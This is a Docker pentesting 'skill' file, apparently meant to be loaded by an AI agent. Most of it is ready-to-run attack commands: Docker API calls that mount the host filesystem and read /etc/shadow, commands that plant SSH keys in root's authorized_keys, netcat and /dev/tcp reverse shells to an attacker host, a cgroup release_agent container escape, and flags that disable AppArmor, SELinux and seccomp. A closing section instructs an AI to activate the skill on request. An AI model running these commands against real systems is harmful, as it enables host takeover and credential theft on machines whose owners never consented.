# Docker Pentesting Skill

## Goal

Exploit Docker API and containers to gain remote code execution, escape container isolation, and access host systems.

## Methodology

1. **Discovery**: Identify exposed Docker APIs
2. **Enumeration**: List containers, images, and configurations
3. **API Exploitation**: Create containers with malicious configurations
4. **Container Escape**: Break out of container isolation
5. **Privilege Escalation**: Leverage Docker for host access

## Ports

- 2375/TCP: Docker API (unencrypted)
- 2376/TCP: Docker API (TLS)

## Tools

* **docker**: Docker client
* **nmap**: Docker scripts
* **curl**: API interaction
* **Metasploit**: Docker modules

## Example Commands

```bash
# Check for exposed Docker API
curl -s http://target:2375/version
curl -s http://target:2375/info
curl -s http://target:2375/containers/json

# Nmap detection
nmap -p2375,2376 --script docker-* target

# Configure docker client to use remote host
export DOCKER_HOST="tcp://target:2375"
docker info
docker ps
docker images
```

## Docker API Enumeration

```bash
# List containers
curl -s http://target:2375/containers/json
curl -s http://target:2375/containers/json?all=1  # Include stopped

# Get container details
curl -s http://target:2375/containers/<id>/json

# List images
curl -s http://target:2375/images/json

# Get system info
curl -s http://target:2375/info
curl -s http://target:2375/version

# List volumes
curl -s http://target:2375/volumes

# List networks
curl -s http://target:2375/networks
```

## Remote Code Execution via API

### Method 1: Create Container with Host Mount

```bash
# Create container mounting host root filesystem
curl -X POST -H "Content-Type: application/json" \
  http://target:2375/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"]
    }
  }'

# Start the container
curl -X POST http://target:2375/containers/<id>/start

# Get output
curl http://target:2375/containers/<id>/logs?stdout=true

# Or get a shell
curl -X POST -H "Content-Type: application/json" \
  http://target:2375/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "echo ssh-rsa AAAA... > /host/root/.ssh/authorized_keys"],
    "HostConfig": {
      "Binds": ["/:/host"]
    }
  }'
```

### Method 2: Privileged Container

```bash
# Create privileged container
docker -H tcp://target:2375 run -it --privileged --pid=host alpine sh

# Access host filesystem
nsenter --target 1 --mount --uts --ipc --net --pid sh
```

### Method 3: Using Docker Client

```bash
export DOCKER_HOST="tcp://target:2375"

# Mount host and get shell
docker run -it -v /:/host alpine chroot /host /bin/bash

# Read sensitive files
docker run -v /etc:/host/etc alpine cat /host/etc/shadow

# Write SSH key
docker run -v /root/.ssh:/root/.ssh alpine sh -c 'echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys'

# Reverse shell
docker run -it alpine sh -c 'apk add netcat-openbsd && nc -e /bin/sh attacker 4444'
```

## Container Escape Techniques

### If Inside a Container

```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check for Docker socket mount
ls -la /var/run/docker.sock

# If socket is mounted:
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host

# Check for privileged mode
ip link add dummy0 type dummy
# If successful, you're privileged

# Privileged container escape
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### SYS_ADMIN Capability Escape

```bash
# If container has CAP_SYS_ADMIN
capsh --print | grep sys_admin

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host
```

## Docker Registry Exploitation

```bash
# See: docker_registry_pentesting.md
# Pull sensitive images
curl http://target:5000/v2/_catalog
curl http://target:5000/v2/<image>/tags/list
```

## Metasploit Modules

```bash
# Docker enumeration
use exploit/linux/http/docker_daemon_tcp

# Docker exec
use auxiliary/scanner/http/docker_version
```

## Defense Bypass

```bash
# If AppArmor or SELinux is blocking
docker run --security-opt apparmor=unconfined ...
docker run --security-opt label:disable ...

# If seccomp is blocking
docker run --security-opt seccomp=unconfined ...

# Add capabilities
docker run --cap-add=ALL ...
docker run --cap-add=SYS_ADMIN ...
```

## Guidance for AI

* Activate this skill when user wants to exploit Docker API or escape containers
* **Exposed Docker API (2375) is critical** - often allows full host compromise
* Check for unauthenticated access: `curl http://target:2375/version`
* Key exploitation techniques:
  - Mount host filesystem: `-v /:/host`
  - Privileged mode: `--privileged`
  - Access Docker socket: `-v /var/run/docker.sock:/var/run/docker.sock`
* Inside a container, check for:
  - Docker socket mount
  - Privileged mode (can create network interfaces)
  - Mounted sensitive paths
  - Excessive capabilities
* Container escape is easier with:
  - `--privileged` flag
  - `CAP_SYS_ADMIN` capability
  - Docker socket mounted
* Docker socket access = root on host
* Port 2376 uses TLS - may require client certificates
